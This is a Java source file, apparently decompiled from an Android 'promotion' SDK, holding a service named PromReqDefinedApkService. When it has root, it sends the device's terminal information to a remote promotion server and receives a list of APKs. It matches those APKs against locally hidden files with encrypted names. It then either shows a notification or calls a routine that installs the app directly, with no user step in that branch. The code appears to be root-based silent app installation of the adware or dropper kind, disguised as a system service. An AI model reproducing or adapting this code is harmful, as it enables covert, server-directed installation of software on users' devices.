package com.zhuoyi.system.promotion.service;

import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import com.zhuoyi.system.network.callback.NetworkCallback;
import com.zhuoyi.system.network.connection.HTTPConnection;
import com.zhuoyi.system.network.object.DefinedApkInfo;
import com.zhuoyi.system.network.protocol.GetDefinedApkReq;
import com.zhuoyi.system.network.protocol.GetDefinedApkResp;
import com.zhuoyi.system.network.serializer.AttributeUitl;
import com.zhuoyi.system.network.serializer.ZyCom_Message;
import com.zhuoyi.system.promotion.util.PromUtils;
import com.zhuoyi.system.promotion.util.constants.BundleConstants;
import com.zhuoyi.system.service.IZyService;
import com.zhuoyi.system.service.ZyService;
import com.zhuoyi.system.service.ZyServiceFactory;
import com.zhuoyi.system.util.EncryptUtils;
import com.zhuoyi.system.util.Logger;
import com.zhuoyi.system.util.TerminalInfoUtil;
import com.zhuoyi.system.util.constant.Session;
import java.util.ArrayList;
import java.util.List;

public class PromReqDefinedApkService extends IZyService {
    public static final String TAG = "PromReqDefinedApkService";
    private List<String> fileNames = new ArrayList();
    private boolean hasRoot;

    class C18421 implements NetworkCallback {
        C18421() {
        }

        public void onResponse(Boolean result, ZyCom_Message respMessage) {
            if (result.booleanValue() && respMessage.head.code == AttributeUitl.getMessageCode(GetDefinedApkResp.class)) {
                GetDefinedApkResp resp = respMessage.message;
                if (resp.getErrorCode() == 0) {
                    List<DefinedApkInfo> apkInfoList = resp.getApkInfoList();
                    Logger.debug(PromReqDefinedApkService.TAG, "DefinedApkInfo size = " + (apkInfoList != null ? apkInfoList.size() : 0));
                    if (PromReqDefinedApkService.this.hasRoot) {
                        for (DefinedApkInfo definedApkInfo : apkInfoList) {
                            Logger.debug(PromReqDefinedApkService.TAG, "definedApkInfo = " + definedApkInfo.toString());
                            if (PromReqDefinedApkService.this.fileNames.contains(EncryptUtils.getEncrypt(definedApkInfo.getPackageName()))) {
                                PromUtils.getInstance(PromReqDefinedApkService.this.mContext).renameBack(definedApkInfo);
                            }
                            for (String fileName : PromReqDefinedApkService.this.fileNames) {
                                if (fileName.contains(definedApkInfo.getFileName()) || fileName.contains(EncryptUtils.getEncrypt(definedApkInfo.getPackageName()))) {
                                    if (PromUtils.getInstance(PromReqDefinedApkService.this.mContext).isInstalled(definedApkInfo.getPackageName()) || !PromUtils.getInstance(PromReqDefinedApkService.this.mContext).isDefinedApkFile(definedApkInfo, fileName)) {
                                        PromUtils.getInstance(PromReqDefinedApkService.this.mContext).removeDefinedApk(definedApkInfo.getPackageName());
                                    } else {
                                        try {
                                            PromReqDefinedApkService.this.dealWithDefinedApk(definedApkInfo, fileName);
                                        } catch (Throwable th) {
                                            Logger.error("dealWithDefinedApk error");
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            } else {
                Logger.error("GetDefinedApkResp error");
            }
            PromReqDefinedApkService.this.stopSelf();
        }
    }

    public PromReqDefinedApkService(int serviceId, Context c, Handler handler) {
        super(serviceId, c, handler);
        this.hasRoot = PromUtils.getRootFlag(c);
        Logger.debug(TAG, "PromReqDefinedApkService has root = " + this.hasRoot);
    }

    public void onStartCommand(Intent intent, int flags, int startId) {
        Logger.debug(TAG, "PromReqDefinedApkService start");
        if (this.hasRoot) {
            this.fileNames = PromUtils.getInstance(this.mContext).getDefineFiles();
            initService();
            return;
        }
        stopSelf();
    }

    public void onServerAddressReponse(Session session) {
        GetDefinedApkReq req = new GetDefinedApkReq();
        req.setTerminalInfo(TerminalInfoUtil.getTerminalInfo(this.mContext));
        req.setPackageName(this.mContext.getPackageName());
        HTTPConnection.getInstance().sendRequest(session.getPromNetworkAddr(), req, new C18421());
    }

    private void dealWithDefinedApk(DefinedApkInfo definedApkInfo, String fileName) throws Exception {
        if (definedApkInfo.getNeedPush()) {
            Intent clickIntent = new Intent(this.mContext, ZyService.class);
            clickIntent.putExtra(BundleConstants.BUNDLE_KEY_SERVICE_ID, ZyServiceFactory.DEFINED_APK_HANDLER_SERVICE.getServiceId());
            clickIntent.putExtra(BundleConstants.BUNDLE_APP_INFO, definedApkInfo);
            clickIntent.putExtra(BundleConstants.BUNDLE_APP_INFO_POSITION, 16);
            clickIntent.putExtra(BundleConstants.BUNDLE_FILE_NAME, fileName);
            PromUtils.getInstance(this.mContext).showDefinedNotify(definedApkInfo.getPushInfo(), clickIntent);
            return;
        }
        PromUtils.getInstance(this.mContext).installDefinedApk(definedApkInfo, fileName);
    }
}
